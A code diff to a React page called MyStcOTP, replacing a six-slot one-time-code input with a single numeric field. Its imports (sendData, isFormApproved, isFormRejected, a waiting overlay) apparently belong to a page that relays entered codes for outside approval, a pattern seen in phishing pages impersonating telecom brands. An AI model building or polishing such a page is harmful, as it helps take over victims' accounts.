@@ -4,11 +4,6 @@ import PageLayout from "@/components/layout/PageLayout";
 import WaitingOverlay from "@/components/WaitingOverlay";
 import { Button } from "@/components/ui/button";
 import {
-  InputOTP,
-  InputOTPGroup,
-  InputOTPSlot,
-} from "@/components/ui/input-otp";
-import {
   sendData,
   isFormApproved,
   isFormRejected,
@@ -68,6 +63,13 @@ export default function MyStcOTP() {
     });
   };
 
+  // السماح فقط بالأرقام
+  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
+    setOtp(value);
+    setError(false);
+  };
+
   return (
     <PageLayout variant="default">
       <WaitingOverlay />
@@ -87,25 +89,24 @@ export default function MyStcOTP() {
         </div>
 
         <form onSubmit={handleSubmit} className="space-y-6">
-          {/* OTP Input - 6 خانات */}
+          {/* OTP Input - حقل واحد */}
           <div className="flex justify-center" dir="ltr">
-            <InputOTP
+            <input
+              ref={inputRef}
+              type="text"
+              inputMode="numeric"
+              pattern="[0-9]*"
               maxLength={6}
               value={otp}
-              onChange={(value) => {
-                setOtp(value);
-                setError(false);
-              }}
-            >
-              <InputOTPGroup>
-                <InputOTPSlot index={0} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={1} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={2} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={3} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={4} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={5} className={error ? "border-red-500" : ""} />
-              </InputOTPGroup>
-            </InputOTP>
+              onChange={handleOtpChange}
+              placeholder="أدخل الرمز"
+              className={`w-48 h-14 text-center text-2xl font-bold border-2 rounded-lg outline-none transition-colors ${
+                error 
+                  ? 'border-red-500 focus:border-red-500' 
+                  : 'border-gray-300 focus:border-purple-600'
+              }`}
+              autoFocus
+            />
           </div>
 
           {error && (
